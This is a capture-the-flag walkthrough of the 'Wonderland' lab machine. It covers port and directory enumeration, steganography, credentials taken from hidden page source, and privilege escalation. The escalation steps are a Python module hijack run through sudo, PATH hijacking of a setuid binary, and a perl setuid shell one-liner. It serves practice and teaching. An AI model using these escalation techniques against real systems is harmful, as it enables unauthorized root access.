Hello, Today im going to find my way into Wonderland and get the flags for user and root.

as i normally do i do like to just go ahead and poke to see if there is a web interface here or just is it running a web server, in this case it is says " Follow the white Rabbit. "


![image](https://github.com/Renat9s/tryhackme/assets/126417250/3c475a45-4eca-4a4c-9421-e8895d398067)



* in the same time --> Starting with quick enumeration :


```

nmap -sV -sC -Pn --p <ip> --open


```


* -sC = Scan with default NSE scripts.
* -sV = detect service version.
* --open = Show only open (or possibly open) ports.
* -p- = scam all posrt.
* -Pn = port scans only and no host discovery.



We get back the following result :


```


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 03:17 EDT
Nmap scan report for 10.10.37.180
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

## You can see there are a few ports running :

-> 22 - SSH


-> 80 - HTTP

--------------------------------------------------------------------------------------------

Have a look at website again :

Nothing on the page, But since we know that the things are not always what the seem to be, image ?

I guess i could download this and run some steganography or do some other file tricks on that, Lets try.


```

wget http://10.10.37.180/img/white_rabbit_1.jpg 


```

Now useing ```steghide``` to look for other files embedded in this image.

* NOTE "  Steghide is a steganography tool that can hide (or extract) files within an image or audio file "

 A passphrase is not required. However, anyone trying to extract the data will be able to do so. just hit ENTER : )

```


steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".


```


Now the embedded text file will be extracted and written to your current directory.


![vmware_se7TFUBJXQ](https://github.com/Renat9s/tryhackme/assets/126417250/5a7e1608-a0cf-420c-845a-fd30802a7099)



* this might be pointing for something! but untill now i have no clue.
-----------------------------------------------------------------------------------

We need to enumerate more.
Im going to use tool called ```ffuf``` to "fuzz" the website, and scan possibly hidden directories and files.


```

ffuf -u http://machine-ip-here/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


```


Result :



```



        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.37.180/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 94ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 94ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 94ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 95ms]
#                       [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 143ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 157ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 157ms]
#                       [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 157ms]
# on atleast 2 different hosts [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 158ms]
                        [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 158ms]
# Copyright 2007 James Fisher [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 227ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 228ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 228ms]
#                       [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 228ms]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 228ms]
r                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 93ms]
poem                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 124ms]
http%3A%2F%2Fwww        [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 103ms]
                        [Status: 200, Size: 402, Words: 55, Lines: 10, Duration: 94ms]
http%3A%2F%2Fyoutube    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 157ms]
http%3A%2F%2Fblogs      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
http%3A%2F%2Fblog       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
**http%3A%2F%2Fwww      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 162ms]
http%3A%2F%2Fcommunity  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 151ms]
http%3A%2F%2Fradar      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
http%3A%2F%2Fjeremiahgrossman [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 93ms]
http%3A%2F%2Fweblog     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 93ms]
http%3A%2F%2Fswik       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
:: Progress: [220560/220560] :: Job [1/1] :: 408 req/sec :: Duration: [0:10:40] :: Errors: 0 ::



```

the ``` r ``` got my attenion !


![vmware_dToUhFxys4](https://github.com/Renat9s/tryhackme/assets/126417250/627178d4-3f64-4381-b0e6-03637a3446aa)



if we look at " Keep going " then see the /r  are you thinking it could be..... ?
Very interesting! now i get the hint it is r/a/b/b/i/t !
you could do more dir and you will find an /a and a /b then you can see you slowly spelling out the word : )

/a



![vmware_3cYdZBN9Tr](https://github.com/Renat9s/tryhackme/assets/126417250/b1fe368b-e942-49db-bf1a-5b1e10c26134)



/b


![vmware_0ltj1Az3rO](https://github.com/Renat9s/tryhackme/assets/126417250/1d87d736-0e41-4ec7-bdb9-d6540c14a56f)


/b



![vmware_Ro9564WStM](https://github.com/Renat9s/tryhackme/assets/126417250/482833b2-5a7a-4703-8c4d-5ba3eed33cb4)



/i


![vmware_e4k9tX8rd3](https://github.com/Renat9s/tryhackme/assets/126417250/98255e55-7441-4c62-afb8-12f8520b1f56)



/t


![vmware_hhAWQuYMD1](https://github.com/Renat9s/tryhackme/assets/126417250/6fdda58d-1c82-4403-910c-c1e1580c56d0)

^
^
Considering that i found an /r/ direcotry : ) , Lets browse to http://ip/r/a/b/b/i/t/ 

*  YES i find my way to alice. 

As i was staring at the sourceCode i noticed there is a little paragragh tag hiddin
Always worth checking page source :



![vmware_rGcygZ9k2k](https://github.com/Renat9s/tryhackme/assets/126417250/9e96c452-b5d2-44d0-a3f1-1a2870560e00)



Looks like a user's credentials. SSH into alice account using the credentials we found.



![vmware_AAokr2EtzX](https://github.com/Renat9s/tryhackme/assets/126417250/5dd3026d-a4d9-4690-b4a7-4d88e36a8b50)




* check around for th user flag.

there is a root.txt in this directory which is kind of funky, but we cant read it its woned by root : )

* No user flag in sight, but " Everything is upside down here "

So if we try to look around a bit we find that there's a “user.txt” text file in the /root directory



```

ls -la /root/user.txt

```



root flat --> /user/root.txt


user flag --> root/user.txt

--------------------------------------------------------------------------------------------

We have the ``` walrus ``` which is readable by us! 


```


import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.
..............
"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))


```


I left the root flag file for the moment, since the permissions didn’t allow me to do anything on it at that time.

anyway. its a python script we see at the top that the random module is being imported (it's a built-in module that you can use to generate random variables, such as random numbers) 





1 :
Looking at our privileges reveals the following:


```
alice@wonderland:/$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py


```

* we could run sudo rights on it, but onlly as rabbit.


we going to import os module and to gain a shell we'll use the system /bin/bash

1 :


```
cat > random.py << EOF

```


2 :


```

> import os
> os.system("/bin/bash")
> EOF

```

Executing the python script:


```

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

```


* We have escalated our privileges to the rabbit user : )


![vmware_HabfC2kSej](https://github.com/Renat9s/tryhackme/assets/126417250/beb50a95-025e-4c92-b2d9-db2eb15556e1)



lets take a look and serach around :



![vmware_2UnRNFGlYV](https://github.com/Renat9s/tryhackme/assets/126417250/acea48f5-1984-47db-b504-17ca42a31ab4)



* find a setuid binary, and by examining the file we see that date is executed without specifying an absolute path :

```

./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 05 Apr 2024 10:14:21 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)

```


So we can use the same technique as before and force our own file to be executed instead. Create our own date file and make it executable:


### Exporting our own $PATH


![vmware_g5D0ypmvWq](https://github.com/Renat9s/tryhackme/assets/126417250/0f99fd32-b453-4e9e-9275-7c99de94b215)




there was only a text file called password.txt. i  tried to login with root and another user called tryhackme but it was actullay hatter's password : )!! i logged in.



![vmware_tb1vcCvK5w](https://github.com/Renat9s/tryhackme/assets/126417250/e78e7c23-cecb-4a1d-b761-b2a84a63479b)



First lets look at the capabilities 


```

$ getcap -r / 2>/dev/null

/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep

```


It uses pearl, So im going to use [GTFObins](https://gtfobins.github.io/) to see the capabilities, search for ``` perl ``` just use this part.



```

$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

```



![vmware_hZ5sb0zTbF](https://github.com/Renat9s/tryhackme/assets/126417250/2212b7c1-1fee-4cad-9394-3749bdbd1682)


Happy hacking < 3
